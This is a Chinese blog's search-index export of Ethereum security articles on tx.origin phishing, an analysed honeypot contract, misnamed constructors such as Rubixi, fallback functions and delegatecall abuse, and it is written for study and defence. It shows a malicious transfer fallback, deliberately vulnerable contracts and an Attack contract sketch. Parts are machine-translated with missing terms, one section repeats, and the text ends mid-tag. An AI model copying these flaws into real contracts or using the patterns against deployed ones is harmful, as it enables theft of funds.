<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>钓鱼式攻击</title>
      <link href="//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB/"/>
      <url>//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="钓鱼式攻击"><a href="#钓鱼式攻击" class="headerlink" title="钓鱼式攻击"></a>钓鱼式攻击</h2><p>虽然原理很简单，混淆可能导致钓鱼式攻击，如<a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">本</a>。<code>tx.origin``msg.sender</code></p><p>下面概述了一个可能的攻击示例。</p><ol><li>使用以确定其令牌传递，如<code>tx.origin</code></li></ol><pre><code>function transfer(address _to, uint _value) {  tokens[tx.origin] -= _value;  tokens[_to] += _value;}</code></pre><ol><li>攻击者让受害者将资金发送到调用代币合约转移函数的恶意合约，例如</li></ol><pre><code>function () payable {  token.transfer(attackerAddress, 10000);}</code></pre><ol><li>在这种情况下，将是受害者的地址（而将是恶意合约的地址），导致资金从受害者转移到攻击者。<code>tx.origin``msg.sender</code></li></ol><h2 id="钓鱼合约的特征"><a href="#钓鱼合约的特征" class="headerlink" title="钓鱼合约的特征"></a>钓鱼合约的特征</h2><p>这些合约通常有这样几个特征：</p><p>\1. 含有“漏洞”：钓鱼钓鱼，没有鱼钩，哪钓到鱼？钓鱼合约一定会包含一个比较明显的“漏洞”，这种漏洞是非常易于利用的，如果稍微研究过一点以太坊智能合约安全或者具有对常见的漏洞又了解的人甚至可以一眼就看出合约中存在的这种“漏洞”。</p><p>\2. 合约具有一定价值：有了鱼钩，当然要上饵。钓鱼合约中通常会有1-2个以太币（Ether）用作鱼饵，并且结合合约的逻辑，这些鱼饵包含了一些背后的故事，比如说是用户的存款或者游戏的奖金之类。</p><p>\3. 在Etherscan上开源：如果在Etherscan上查不到合约的源代码，一般人是不会通过仔细研究合约的bytecode来理解合约有哪些功能的。为了吸引别人看自己合约的源代码，钓鱼合约通常会在Etherscan上公开合约源代码。</p><p>\4. 源代码比较短：为了让看合约的人快速理解并找到“漏洞”，钓鱼合约的代码长度一般不会太长，经常只有几十行代码。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803113610588.png"></p><p>搜一下”0x2a752d08F2EAD90C1CF7572d8A00C00E7b1913Cf”</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803113918573.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803113939007.png"></p><h2 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h2><p>直接上钓鱼合约的代码。</p><pre><code class="text">/** *Submitted for verification at Etherscan.io on 2020-12-26*/contract US_Game{    function Try(string _response) external payable     {        require(msg.sender == tx.origin);        if(responseHash == keccak256(_response) &amp;&amp; msg.value &gt; 1 ether)        {            msg.sender.transfer(this.balance);        }    }    string public question;    bytes32 responseHash;    mapping (bytes32=&gt;bool) admin;    function Start(string _question, string _response) public payable isAdmin{        if(responseHash==0x0){            responseHash = keccak256(_response);            question = _question;        }    }    function Stop() public payable isAdmin {        msg.sender.transfer(this.balance);    }    function New(string _question, bytes32 _responseHash) public payable isAdmin {        question = _question;        responseHash = _responseHash;    }    constructor(bytes32[] admins) public{        for(uint256 i=0; i&lt; admins.length; i++){            admin[admins[i]] = true;                }           }    modifier isAdmin(){        require(admin[keccak256(msg.sender)]);        _;    }    function() public payable{}}</code></pre><p>可能有些读者对Solidity（智能合约编写语言）不太熟悉，我就简单讲讲这个代码，如果读者可以自己阅读代码可直接跳到下一节。 首先是合约的构造函数<code>constructor</code>，这种函数会且仅会在合约被部署的时候被执行，对于这个合约而言，<code>constructor</code>的作用是将一个byte32数组中的每个成员在合约中<strong>admin</strong>这个mapping中的对应位置置位。</p><p>置位有啥用呢？这里看<code>modifier isAdmin()</code>这个片段，它是一种修饰器，修饰器名字叫<strong>isAdmin</strong>，只要函数后面带了<strong>isAdmin</strong>，这个片段就会被编译器加到函数最前面去。这个合约里面<strong>isAdmin</strong>规定其修饰的函数只能由特定的用户调用，如果调用者的地址的keccak256哈希值在<strong>admin</strong>中对应的位置不是True，调用就会失败。</p><p>然后看主要的功能函数。在此之前我先讲一下这个合约是想要伪装成一个解谜游戏，合约的admin会将问题答案对应的哈希值和问题放到合约中，如果<em>游戏参与者</em>提交的答案哈希值与正确答案哈希值相同就可以拿到奖金。以此为背景去理解这个合约的主要功能函数：</p><ul><li><code>Try</code> ：这个函数是<em>游戏参与者</em>在猜谜游戏中提交答案的途径，参与者每次竞猜除了要提供自己的答案外，还要向这个合约中转入至少1以太币，这也是该合约获利的方式。</li><li><code>Start</code>：仅admin可用，接收两个参数：一个是新的问题**_question<strong>，另一个是该问题的回答</strong>_response<strong>，并且如果之前没有设置合约中回答的哈希值，这个函数会将这个值设置为参数中</strong>_response**的哈希值</li><li><code>Stop</code>：仅admin可用，终止游戏，将合约中的以太币转走。</li><li><code>New</code>：仅admin可用，设置新的问题和答案哈希值。</li></ul><h2 id="合约漏洞"><a href="#合约漏洞" class="headerlink" title="合约漏洞"></a>合约漏洞</h2><p>可以看到，合约中有个非常诡异的函数：<code>Start</code>，它的第二个参数其实就是问题的答案，由于以太坊的历史交易都是公开的，如果通过这个函数去设置游戏中的问题，那么该问题的答案也会被所有人看到。如果说这是开发者对以太坊不熟悉、不了解，<code>New</code>函数中设置新问题和回答的方法却是正确的做法，所以可以很明显地看出这里是合约开发者故意留下这个“漏洞”作为鱼钩进行钓鱼的，这个合约在被部署后，其<strong>部署者</strong>也确实调用了<code>Start</code>方法，并设置了15个Ether的奖金作为鱼饵。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803114156012.png"></p><h3 id="第一层：监听？"><a href="#第一层：监听？" class="headerlink" title="第一层：监听？"></a>第一层：监听？</h3><p>刚开始我没有细看交易，我想的是既然admin可以随时更改问题和答案，会不会持续监听链上交易，如果发现有人发出了提交正确答案的交易，就用更高的gas price，抢在正确答案被提交前修改问题和答案，使得游戏参与者白费功夫？类似的情形我们也见到过，不过不适用于这里。首先这个合约给出的鱼饵太大了，万一失手可能得不偿失，而且现在矿池提供了暗池服务，这样钓鱼风险还是很大的。所以我觉得合约中还有其他玄机。</p><h3 id="第二层：合约部署者其实不是admin？"><a href="#第二层：合约部署者其实不是admin？" class="headerlink" title="第二层：合约部署者其实不是admin？"></a>第二层：合约部署者其实不是admin？</h3><p>Etherscan提供了查看交易改变的世界状态的功能，其实仔细看该合约<strong>部署者</strong>发出的这笔交易改变的状态可以发现，合约并没有任何一个值被这个交易改变了。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803114318492.png"></p><p>这就很耐人寻味，因为合约部署时只设置了<strong>admin</strong>这个mapping的值，没有改变<strong>responseHash</strong>，也就是答案的哈希值。如果部署者是admin，这笔交易应当会将<strong>question</strong>和<strong>responseHash</strong>都设置为对应的值。而我们回过头来看合约代码：</p><pre><code class="text">modifier isAdmin(){        require(admin[keccak256(msg.sender)]);        _;    }</code></pre><p>观察这里可以发现，<strong>admin</strong>这个mapping里面的key其实是地址哈希值，这是不是为了隐藏信息呢？通过这样的设计，我们没办法通过<code>constructor</code>的参数知晓部署者是否为admin，误以为部署者必然是合约的admin，从而被他调用<code>Start</code>的行为误导。如果是这样的话，由于实际上这次调用并没有修改<strong>responseHash</strong>，所以如果有人以合约部署者一定是admin的前提去预估合约的执行结果，就会上钩。</p><p>正当我以为找到了正解的时候，这里还有个问题让我无法将整个流程梳理清楚：在<code>modifier</code>中是使用了<strong>require</strong>来验证交易发送者是不是admin的，不管按照旧版Solidity还是新版中的定义，如果条件不满足，合约应当会<em>revert</em>这笔交易，也就是说，这里甚至不应该继续执行下去，Etherscan也应该给出reverted的信息，这笔交易附带的以太币也应该退还给发送者。看来这个思路不对。</p><h3 id="第三层：内部交易。"><a href="#第三层：内部交易。" class="headerlink" title="第三层：内部交易。"></a>第三层：内部交易。</h3><p>最后我想看看与这个合约相关的有哪些内部交易（由合约调用合约）。由于Etherscan对内部交易显示不全，我并没有能在Etherscan上找到答案，因此，我用了其他的工具，发现确实有一笔内部交易与这个合约相关，再追查这笔内部交易改变的状态发现，在调用<code>Start</code>方法之前，有人已经通过哈希为<em>0x0d974ab8723e15b1e5d2d2766aca443e494c03fe9bbbff8eaf18a26c416a8f77</em>的交易调用另一个合约改写了<strong>responseHash</strong>，所以调用<code>Start</code>方法的这笔交易并没有改变合约中的任何变量。 所以说，由于Etherscan不能显示这样的内部交易，导致我们没能一开始就找出问题的真正原因。<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803114737770.png"></p><p>继续追查，通过内部交易改写钓鱼合约状态的那个合约地址为<em>0xf4e96e2d3b4e27853b5eabc5b0ddcc664f2b1ed1</em>，已经有417笔交易了，看来这个人是老渔夫了。<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803112856164.png"></p><h3 id="受害者"><a href="#受害者" class="headerlink" title="受害者"></a>受害者</h3><p>刚刚提到的钓鱼合约可以看到，它已经成功地钓到了一只肥鱼了。截至到本文发布，以太币价格是1270美刀（怎么又涨了这么多），也就是说受害者损失2个以太币，金额达到了2500美刀左右，看着就肉痛。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>人为财死，鸟为食亡。15个以太币虽然价值很高，看起来很诱人，但是这些钓鱼合约其实都是设计好的，不可能让你真正吃到这香喷喷的鱼饵的，所以，如果你也遇到一个看起来有漏洞、只需要动动手指就能攻击的合约，一定一定要多想想！</p><p>顺带一提，如果想持续关注这一类钓鱼合约或者你想到了反钓鱼的方法，可以在Etherscan上查看<em>0xf4e96e2d3b4e27853b5eabc5b0ddcc664f2b1ed1</em>这个地址的交易，看它最新的交易修改了哪个合约中的变量</p>]]></content>
      
      
      <categories>
          
          <category> 以太坊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构造函数失控</title>
      <link href="//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%A4%B1%E6%8E%A7/"/>
      <url>//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%A4%B1%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="构造函数失控"><a href="#构造函数失控" class="headerlink" title="构造函数失控"></a>构造函数失控</h2><p>构造函数（Constructors）是特殊函数，在初始化合约时经常执行关键的权限任务。在 solidity v0.4.22 以前，构造函数被定义为与所在合约同名的函数。因此，如果合约名称在开发过程中发生变化，而构造函数名称没有更改，它将变成正常的可调用函数。正如你可以想象的，这可以（并且已经）导致一些有趣的合约被黑。</p><h3 id="1-1-漏洞"><a href="#1-1-漏洞" class="headerlink" title="1.1 漏洞"></a>1.1 漏洞</h3><p>如果合约名称被修改，或者在构造函数名称中存在拼写错误以致它不再与合约名称匹配，则构造函数的行为将与普通函数类似。这可能会导致可怕的后果，特别是如果构造函数正在执行有权限的操作。考虑以下合约：</p><pre><code>contract OwnerWallet {    address public owner;    //constructor    function ownerWallet(address _owner) public {        owner = _owner;    }    // fallback. Collect ether.    function () payable {}     function withdraw() public {        require(msg.sender == owner);         msg.sender.transfer(this.balance);    }}</code></pre><p>该合约储存 Ether，并只允许所有者通过调用 <code>withdraw()</code> 函数来取出所有 Ether。但由于构造函数的名称与合约名称不完全一致，这个合约会出问题。具体来说， <code>ownerWallet</code> 与 <code>OwnerWallet</code> 不相同。因此，任何用户都可以调用 <code>ownerWallet()</code> 函数，将自己设置为所有者，然后通过调用 <code>withdraw()</code> 将合约中的所有 Ether 都取出来。</p><h3 id="1-2-预防技术"><a href="#1-2-预防技术" class="headerlink" title="1.2 预防技术"></a>1.2 预防技术</h3><p>这个问题在 Solidity 0.4.22 版本的编译器中已经基本得到了解决。该版本引入了一个关键词 <code>constructor</code> 来指定构造函数，而不是要求函数的名称与合约名称匹配。建议使用这个关键词来指定构造函数，以防止上面显示的命名问题。</p><h3 id="1-3-真实世界的例子：Rubixi"><a href="#1-3-真实世界的例子：Rubixi" class="headerlink" title="1.3 真实世界的例子：Rubixi"></a>1.3 真实世界的例子：Rubixi</h3><p>Rubixi（<a href="https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code">合约代码</a>）是另一个显现出这种漏洞的传销方案。合约中的构造函数一开始叫做 <code>DynamicPyramid</code> ，但合约名称在部署之前已改为 <code>Rubixi</code> 。构造函数的名字没有改变，因此任何用户都可以成为 <code>creator</code> 。这篇 <a href="https://bitcointalk.org/index.php?topic=1400536.60">Bitcoin Thread</a> 中可以找到关于这个 bug 的一些有趣的讨论。总之，用户因为这个漏洞开始互相争夺 <code>creator</code> 身份，以从合约中获得金钱。关于这个特定 bug 的更多细节可以在<a href="https://applicature.com/blog/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes">这里</a>找到。</p><p>Rubixi 的故事是以太坊生态系统中一个非常有名的案例。该公司将其名称从“动态金字塔”更改为“Rubixi”，当在写智能合约时，很多时候会出现错误。在激活合约之前，对整体的函数，参数和合约结构进行审核，是非常必要的。但不知何故他们没有重命名其合约的构造函数方法：</p><pre><code>contract Rubixi {  address private owner;  function DynamicPyramid() { owner = msg.sender; }  function collectAllFees() { owner.transfer(this.balance) }  ...</code></pre><p>如果在以太坊历史上，有智能合约是因为整体架构出问题，而最终失败的，毫无疑问就是Rubixi。Rubixi是另一个旁氏游戏，其中玩家需要发送以太币到合约中，并且可以获得更多的以太币。但是，在Rubixi开发的过程中，拥有者随意更改了合约名称，但是并没有检测任何的不一致性。毋庸置疑，Rubixi远不能称为“成功”。</p><p>这允许攻击者调用旧的构造函数并声明合约的所有权，并窃取一些资金。是的。智能合约领域可能会犯大错误。</p><p><strong>攻击示例</strong></p><p>由于Solidity v0.4.24算法，合约的管理器功能是construct()。但是，在Rubixi合约创建的时候，管理器功能被以太坊虚拟机和合约共享了同个名字。Rubixi的问题在于当合约中部署了管理器的名称为function DynamicPyramid() ，而不是function Rubixi(),，这就意味着Rubixi最初的名字叫“DynamicPyramid”。由于这个不一致性，合约在创建的时候，并没有指定拥有者，所以城堡的钥匙被抢走了。任何人都能够定义他们自己为合约的拥有者，然后获得参与者加入的合约费用。</p><p><strong>代码示例</strong></p><p>如果我们把合约代码的前几行拿出来，你就会发现合约名称和指定管理器函数的区别。</p><p><img src="https://pic3.zhimg.com/80/v2-bb9a12689975ee11999269c74550eafe_720w.jpg"></p><p>现在你应该明白了，攻击者需要做的，就是创建合约的名字为function DynamicPyramid(), 然后获得拥有权。然后，攻击者可以调用function collectAllFees()，然后提现。虽然这个攻击已经非常直接了，Rubixi是个很好的例子，告诉我们一定要彻底地检查合约。</p><p><img src="https://pic2.zhimg.com/80/v2-e91543fd81dede4efc1e63b93cbcc549_720w.jpg"></p><p>很幸运地是，Solidity语言已经更新了，以至于管理器功能被定义为constructor() ，而不是contractName()。我们可以从中学到的是，多次检查我们的合约代码，并且保证你在整个开发过程中，保持一致性。没有什么比部署一个无法改变的合约，但是发现其中有问题，更糟糕了。</p><p>从被DoS到交易系统异常，到项目被冰封直至被遗忘，但是只要我们铭记教训，就能稳固地保持区块链技术的发展。</p><p>旁氏游戏或许已经是过去的事情，但是George Santayana曾经说过，“那些不能从历史中学到教训的人，还会重复错误。”通过从KotET, GovernMental和Rubixi这类错误中学习，我们可以防止自己在错误的道路上越走越远。</p>]]></content>
      
      
      <categories>
          
          <category> 以太坊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fallback函数</title>
      <link href="//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/Fallback%E5%87%BD%E6%95%B0/"/>
      <url>//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/Fallback%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback函数"><a href="#Fallback函数" class="headerlink" title="Fallback函数"></a>Fallback函数</h2><p><a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html?highlight=transfer#fallback">官方解释</a></p><p>合约可以有一个未命名的函数。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。</p><p>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 <code>payable</code>。 如果不存在这样的函数，则合约不能通过常规交易接收以太币。</p><p>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p><p>具体来说，以下操作会消耗比 fallback 函数更多的 gas：</p><ul><li>写入存储</li><li>创建合约</li><li>调用消耗大量 gas 的外部函数</li><li>发送以太币</li></ul><p>请确保您在部署合约之前彻底测试您的 fallback 函数，以确保执行成本低于 2300 个 gas。</p><h6 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h6><p>即使 fallback 函数不能有参数，仍然可以使用 <code>msg.data</code> 来获取随调用提供的任何有效数据。</p><h6 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h6><p>一个没有定义 fallback 函数的合约，直接接收以太币（没有函数调用，即使用 <code>send</code> 或 <code>transfer</code>）会抛出一个异常， 并返还以太币（在 Solidity v0.4.0 之前行为会有所不同）。所以如果你想让你的合约接收以太币，必须实现 fallback 函数。</p><h6 id="警告-1"><a href="#警告-1" class="headerlink" title="警告"></a>警告</h6><p>一个没有 payable fallback 函数的合约，可以作为 coinbase transaction （又名 miner block reward ）的接收者或者作为 <code>selfdestruct</code> 的目标来接收以太币。</p><p>一个合约不能对这种以太币转移做出反应，因此也不能拒绝它们。这是 EVM 在设计时就决定好的，而且 Solidity 无法绕过这个问题。</p><p>这也意味着 <code>this.balance</code> 可以高于合约中实现的一些手工记帐的总和（即在 fallback 函数中更新的累加器）。</p><pre><code>pragma solidity ^0.4.0;contract Test {    // 发送到这个合约的所有消息都会调用此函数（因为该合约没有其它函数）。    // 向这个合约发送以太币会导致异常，因为 fallback 函数没有 `payable` 修饰符    function() public { x = 1; }    uint x;}// 这个合约会保留所有发送给它的以太币，没有办法返还。contract Sink {    function() public payable { }}contract Caller {    function callTest(Test test) public {        test.call(0xabcdef01); // 不存在的哈希        // 导致 test.x 变成 == 1。        // 以下将不会编译，但如果有人向该合约发送以太币，交易将失败并拒绝以太币。        // test.send(2 ether）;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 以太坊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Call,delegatecall,callcode函数簇</title>
      <link href="//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/Call,delegatecall,callcode%E5%87%BD%E6%95%B0%E7%B0%87/"/>
      <url>//%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E5%8C%BA%E5%9D%97%E9%93%BE/Call,delegatecall,callcode%E5%87%BD%E6%95%B0%E7%B0%87/</url>
      
        <content type="html"><![CDATA[<h2 id="Call-delegatecall-callcode函数簇"><a href="#Call-delegatecall-callcode函数簇" class="headerlink" title="Call,delegatecall,callcode函数簇"></a>Call,delegatecall,callcode函数簇</h2><p><a href="https://solidity-cn.readthedocs.io/zh/develop/types.html#members-of-addresses">官方解释</a></p><p><a href="http://solidity.readthedocs.io/en/v0.4.24/">Solidity</a> 是一种用与编写以太坊智能合约的高级语言，语法类似于 JavaScript。Solidity 编写的智能合约可被编译成为字节码在以太坊虚拟机上运行。Solidity 中的合约与面向对象编程语言中的类（Class）非常类似，在一个合约中同样可以声明：状态变量、函数、事件等。同时，一个合约可以调用/继承另外一个合约。</p><p>在 Solidity 中提供了 <code>call</code>、<code>delegatecall</code>、<code>callcode</code> 三个函数来实现合约之间相互调用及交互。正是因为这些灵活各种调用，也导致了这些函数被合约开发者“滥用”，甚至“肆无忌惮”提供任意调用“功能”，导致了各种安全漏洞及风险：</p><p>2017.7.20，Parity Multisig电子钱包版本 1.5+ 的漏洞被发现，使得攻击者从三个高安全的多重签名合约中<a href="https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7">窃取到超过 15 万 ETH</a> ，其事件原因是由于未做限制的 <code>delegatecall</code> 函数调用了合约初始化函数导致合约拥有者被修改。</p><p>2018.6.16，「隐形人真忙」在先知大会上演讲了<a href="https://paper.seebug.org/625/">「智能合约消息调用攻防」</a>的议题，其中提到了一种新的攻击场景—— <code>call</code> 注⼊，主要介绍了利用对 <code>call</code> 调用处理不当，配合一定的应用场景的一种攻击手段。接着于 2018.6.20，<code>ATN</code> 代币团队发布<a href="https://paper.seebug.org/621/">「ATN抵御黑客攻击的报告」</a>，报告指出黑客利用 <code>call</code> 注入攻击漏洞修改合约拥有者，然后给自己发行代币，从而造成 <code>ATN</code> 代币增发。</p><p>由此本文主要是针对 Solidity 合约调用函数<code>call</code>、<code>delegatecall</code>、<code>callcode</code> 三种调用方式的异同、滥用导致的漏洞模型并结合实际案例进行分析介绍。</p><h3 id="Solidity-的三种调用函数"><a href="#Solidity-的三种调用函数" class="headerlink" title="Solidity 的三种调用函数"></a>Solidity 的三种调用函数</h3><p>在 Solidity 中，<code>call</code> 函数簇可以实现跨合约的函数调用功能，其中包括 <code>call</code>、<code>delegatecall</code> 和 <code>callcode</code> 三种方式。</p><p>以下是 Solidity 中 <code>call</code> 函数簇的调用模型：</p><pre><code>&lt;address&gt;.call(...) returns (bool)&lt;address&gt;.callcode(...) returns (bool)&lt;address&gt;.delegatecall(...) returns (bool)</code></pre><p>这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。</p><p>在函数调用的过程中， Solidity 中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p><p><strong>三种调用方式的异同点</strong></p><ul><li>call: 最常用的调用方式，调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，执行环境为<strong>被调用者</strong>的运行环境(合约的 storage)。</li><li>delegatecall: 调用后内置变量 <code>msg</code> 的值<strong>不会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</li><li>callcode: 调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</li></ul><h3 id="delegatecall-「滥用」问题"><a href="#delegatecall-「滥用」问题" class="headerlink" title="delegatecall 「滥用」问题"></a>delegatecall 「滥用」问题</h3><blockquote><p>delegatecall: 调用后内置变量 <code>msg</code> 的值<strong>不会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在智能合约的开发过程中，合约的相互调用是经常发生的。开发者为了实现某些功能会调用另一个合约的函数。比如下面的例子，调用一个合约 A 的 <code>test()</code> 函数，这是一个正常安全的调用。</p><pre><code>function test(uint256 a) public {    // codes}function callFunc() public {&lt;A.address&gt;.delegatecall(bytes4(keccak256("test(uint256)")), 10);}</code></pre><p>但是在实际开发过程中，开发者为了兼顾代码的灵活性，往往会有下面这种写法：</p><pre><code>function callFunc(address addr, bytes data) public {    addr.delegatecall(data);}</code></pre><p>这将引起任意 public 函数调用的问题：合约中的 <code>delegatecall</code> 的调用地址和调用的字符序列都由用户传入，那么完全可以调用任意地址的函数。</p><p>除此之外，由于 <code>delegatecall</code> 的执行环境为调用者环境，当调用者和被调用者有相同变量时，如果被调用的函数对变量值进行修改，那么修改的是调用者中的变量。</p><h4 id="利用模型"><a href="#利用模型" class="headerlink" title="利用模型"></a>利用模型</h4><p>下面的例子中 B 合约是业务逻辑合约，其中存在一个任意地址的 <code>delegatecall</code> 调用。</p><pre><code>contract B {    address owner;    function callFunc(address addr, bytes data) public {        addr.delegatecall(data);        //address(Attack).delegatecall(bytes4(keccak256("foo()")));  //利用代码示意    }}</code></pre><p>攻击者对应这种合约可以编写一个 Attack 合约，然后精心构造字节序列(将注释部分的攻击代码转换为字节序列)，通过调用合约 B 的 <code>delegatecall</code>，最终调用 Attack 合约中的函数，下面是 Attack 合约的例子：</p><pre><code>contract Attack {    address owner;    function foo() public {        // any codes    }}</code></pre><p>对于 <code>delegatecall</code> 「滥用」的问题，实际的漏洞效果取决于 Attack 合约中的攻击代码，可能造成的安全问题包括：</p><ol><li>攻击者编写一个转账的函数，窃取合约 B 的货币</li><li>攻击者编写设置合约拥有者的函数，修改合约 B 的拥有者</li></ol><p>在智能合约的开发过程中，合约的相互调用是经常发生的。开发者为了实现某些功能会调用另一个合约的函数。比如下面的例子，调用一个合约 A 的 <code>test()</code> 函数，这是一个正常安全的调用。</p><pre><code>function test(uint256 a) public {    // codes}function callFunc() public {    &lt;A.address&gt;.delegatecall(bytes4(keccak256("test(uint256)")), 10);}</code></pre><p>但是在实际开发过程中，开发者为了兼顾代码的灵活性，往往会有下面这种写法：</p><pre><code>function callFunc(address addr, bytes data) public {    addr.delegatecall(data);}</code></pre><p>这将引起任意 public 函数调用的问题：合约中的 <code>delegatecall</code> 的调用地址和调用的字符序列都由用户传入，那么完全可以调用任意地址的函数。</p><p>除此之外，由于 <code>delegatecall</code> 的执行环境为调用者环境，当调用者和被调用者有相同变量时，如果被调用的函数对变量值进行修改，那么修改的是调用者中的变量。</p><h4 id="利用模型-1"><a href="#利用模型-1" class="headerlink" title="利用模型"></a>利用模型</h4><p>下面的例子中 B 合约是业务逻辑合约，其中存在一个任意地址的 <code>delegatecall</code> 调用。</p><pre><code>contract B {    address owner;    function callFunc(address addr, bytes data) public {        addr.delegatecall(data);        //address(Attack).delegatecall(bytes4(keccak256("foo()")));  //利用代码示意    }}</code></pre><p>攻击者对应这种合约可以编写一个 Attack 合约，然后精心构造字节序列(将注释部分的攻击代码转换为字节序列)，通过调用合约 B 的 <code>delegatecall</code>，最终调用 Attack 合约中的函数，下面是 Attack 合约的例子：</p><pre><code>contract Attack {    address owner;    function foo() public {        // any codes    }}</code></pre><p>对于 <code>delegatecall</code> 「滥用」的问题，实际的漏洞效果取决于 Attack 合约中的攻击代码，可能造成的安全问题包括：</p><ol><li>攻击者编写一个转账的函数，窃取合约 B 的货币</li><li>攻击者编写设置合约拥有者的函数，修改合约 B 的拥有者</li></ol><h4 id="delegatecall-安全问题案例"><a href="#delegatecall-安全问题案例" class="headerlink" title="delegatecall 安全问题案例"></a>delegatecall 安全问题案例</h4><p><a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/"><strong>Parity MultiSig钱包事件</strong></a></p><p>2017.7.20，Parity Multisig电子钱包版本 1.5+ 的漏洞被发现，使得攻击者从三个高安全的多重签名合约中窃取到超过 15 万 ETH ，按照当时的 ETH 价格来算，大约为 3000 万美元。</p><p>今天，我们目睹了以太坊网络历史上第二大黑客攻击，就 ETH 被盗而言。截至 UTC 时间下午 12:19，（[攻击者的账户]<a href="https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32#internaltx%EF%BC%89%E5%B7%B2%E7%BB%8F%E4%BB%8E%E8%BF%87%E5%8E%BB%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%89%E4%B8%AA%E5%A4%87%E5%8F%97%E7%9E%A9%E7%9B%AE%E7%9A%84%E4%BB%A3%E5%B8%81%E9%94%80%E5%94%AE%E5%90%88%E5%90%8C%E4%B8%AD%E6%8F%90%E5%8F%96%E4%BA%86">https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32#internaltx）已经从过去使用的三个备受瞩目的代币销售合同中提取了</a> 153,037 个 ETH，用于存储多重签名。该问题最初是<a href="https://blog.parity.io/security-alert-high-2/">由 Parity 团队报告的</a>，因为<a href="https://github.com/paritytech/parity/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol">受影响的 MultiSig 钱包合约是 Parity 软件套件的一部分</a>。</p><p>其事件原因是由于未做限制的 <code>delegatecall</code> 可以调用 <code>WalletLibrary</code> 合约的任意函数，并且其钱包初始化函数未做校验，导致初始化函数可以重复调用。攻击者利用这两个条件，通过 <code>delegatecall</code> 调用 <code>initWallet()</code> 函数，最终修改了合约拥有者，并将合约中的以太币转到自己的账户下。</p><h4 id="攻击解释"><a href="#攻击解释" class="headerlink" title="攻击解释"></a>攻击解释</h4><p>下面是存在安全问题的代码片段：<a 